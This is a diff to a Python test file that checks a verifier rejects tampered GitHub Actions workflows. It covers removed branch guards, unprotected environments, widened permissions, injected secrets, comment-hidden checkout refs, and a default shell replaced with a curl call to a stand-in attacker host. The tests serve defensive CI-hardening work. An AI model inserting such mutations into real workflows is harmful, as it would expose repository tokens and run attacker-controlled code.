@@ -577,7 +577,7 @@ def test_toolchain_version_guard_accepts_official_metadata_and_rejects_invalid_v
     tmp_path: Path,
 ) -> None:
     guards = _version_guards(ROOT)
-    assert len(guards) == 17
+    assert len(guards) == 19
     assert all(_run_guard(ROOT, guard).returncode == 0 for guard in guards)
 
     fake_repository = tmp_path / "repository"
@@ -656,16 +656,60 @@ def test_source_execution_mutations_fail_closed(
 @pytest.mark.parametrize(
     ("needle", "replacement"),
     (
-        ("lock-fresh-campaign", "run-acceptance --action benchmark"),
+        (
+            "skillscout.cli lock-fresh-campaign",
+            "skillscout.cli run-acceptance --action benchmark",
+        ),
         (
             "environment: phase6-human-benchmark-lock",
             "environment: unprotected-environment",
         ),
         (
+            "environment: phase6-human-benchmark-lock",
+            "environment: unprotected-environment # phase6-human-benchmark-lock",
+        ),
+        (
+            "if: ${{ inputs.phase6_action == 'lock-fresh-campaign' && github.repository == 'alexzhu0/skillscout' && github.ref == 'refs/heads/main' }}",
+            "if: ${{ inputs.phase6_action == 'lock-fresh-campaign' && github.repository == 'alexzhu0/skillscout' }}",
+        ),
+        (
+            "if: ${{ inputs.phase6_action == 'lock-fresh-campaign' && github.repository == 'alexzhu0/skillscout' && github.ref == 'refs/heads/main' }}",
+            "if: ${{ inputs.phase6_action == 'lock-fresh-campaign' && github.repository == 'alexzhu0/skillscout' && github.ref == 'refs/heads/main' }} # trusted",
+        ),
+        (
+            "if: ${{ inputs.phase6_action == 'prepare-fresh-campaign' && github.repository == 'alexzhu0/skillscout' && github.ref == 'refs/heads/main' }}",
+            "if: ${{ inputs.phase6_action == 'prepare-fresh-campaign' && github.ref == 'refs/heads/main' }}",
+        ),
+        (
+            "environment: phase6-fresh-nomination",
+            "environment: unprotected-fresh-nomination",
+        ),
+        (
+            "SKILLSCOUT_STATE_GITHUB_TOKEN: ${{ secrets.SKILLSCOUT_FRESH_NOMINATION_STATE_GITHUB_TOKEN }}",
+            "SKILLSCOUT_STATE_GITHUB_TOKEN: ${{ secrets.SKILLSCOUT_STATE_GITHUB_TOKEN }}",
+        ),
+        (
+            "SKILLSCOUT_STATE_GITHUB_TOKEN: ${{ secrets.SKILLSCOUT_BENCHMARK_LOCK_STATE_GITHUB_TOKEN }}",
+            "SKILLSCOUT_STATE_GITHUB_TOKEN: ${{ secrets.SKILLSCOUT_STATE_GITHUB_TOKEN }}",
+        ),
+        (
             "permissions:\n      contents: read\n      actions: read",
             "permissions:\n      contents: write",
         ),
-        ("GITHUB_TOKEN: ${{ github.token }}", "GITHUB_TOKEN: ${{ vars.UNRELATED_TOKEN }}"),
+        (
+            "permissions:\n      contents: read\n      actions: read",
+            "permissions:\n      contents: read\n      actions: read\n      \"issues\": write",
+        ),
+        (
+            "        env:\n          GITHUB_TOKEN: ${{ github.token }}",
+            "        env:\n          GITHUB_TOKEN: ${{ vars.UNRELATED_TOKEN }}",
+        ),
+        (
+            "        env:\n          GITHUB_TOKEN: ${{ github.token }}",
+            "        env:\n          GITHUB_TOKEN: ${{ github.token }}\n"
+            "          \"SKILLSCOUT_STATE_GITHUB_TOKEN\": "
+            "${{ secrets.SKILLSCOUT_STATE_GITHUB_TOKEN }}",
+        ),
     ),
 )
 def test_source_execution_verifier_rejects_protected_fresh_lock_mutations(
@@ -676,6 +720,68 @@ def test_source_execution_verifier_rejects_protected_fresh_lock_mutations(
     module = _module()
     repository = _copy_workflows(tmp_path)
     _replace_first(repository, needle, replacement)
+    with pytest.raises(module.SourceExecutionError):
+        module.verify_source_execution(repository)
+
+
+@pytest.mark.parametrize(
+    "mutation",
+    (
+        "commented_checkout_ref",
+        "poisoned_materialization",
+        "inherited_state_secret",
+        "custom_default_shell",
+    ),
+)
+def test_source_execution_verifier_closes_fresh_job_inherited_context(
+    tmp_path: Path,
+    mutation: str,
+) -> None:
+    """Fresh-job authority cannot be changed by comments or root inheritance."""
+
+    module = _module()
+    repository = _copy_workflows(tmp_path)
+    path = repository / Path(".github/workflows/phase6-acceptance.yml")
+    source = path.read_text(encoding="utf-8")
+    if mutation == "commented_checkout_ref":
+        prefix, marker, suffix = source.partition("  prepare_fresh_campaign:\n")
+        assert marker
+        needle = "ref: ${{ github.sha }}\n          persist-credentials: false"
+        assert needle in suffix
+        source = prefix + marker + suffix.replace(
+            needle,
+            "ref: attacker-ref # ${{ github.sha }}\n          persist-credentials: false",
+            1,
+        )
+    elif mutation == "poisoned_materialization":
+        prefix, marker, suffix = source.partition("  prepare_fresh_campaign:\n")
+        assert marker
+        needle = "          mkdir -p .tools/uv-0.11.29/bin"
+        assert needle in suffix
+        source = prefix + marker + suffix.replace(
+            needle,
+            "          python -c 'raise SystemExit(0)'\n"
+            "          # mkdir -p .tools/uv-0.11.29/bin",
+            1,
+        )
+    elif mutation == "inherited_state_secret":
+        needle = "defaults:\n  run:\n    shell: bash"
+        assert needle in source
+        source = source.replace(
+            needle,
+            "env:\n  SKILLSCOUT_STATE_GITHUB_TOKEN: "
+            "${{ secrets.SKILLSCOUT_STATE_GITHUB_TOKEN }}\n" + needle,
+            1,
+        )
+    else:
+        needle = "defaults:\n  run:\n    shell: bash"
+        assert needle in source
+        source = source.replace(
+            needle,
+            "defaults:\n  run:\n    shell: bash -c 'curl https://attacker.invalid' --",
+            1,
+        )
+    path.write_text(source, encoding="utf-8")
     with pytest.raises(module.SourceExecutionError):
         module.verify_source_execution(repository)
 
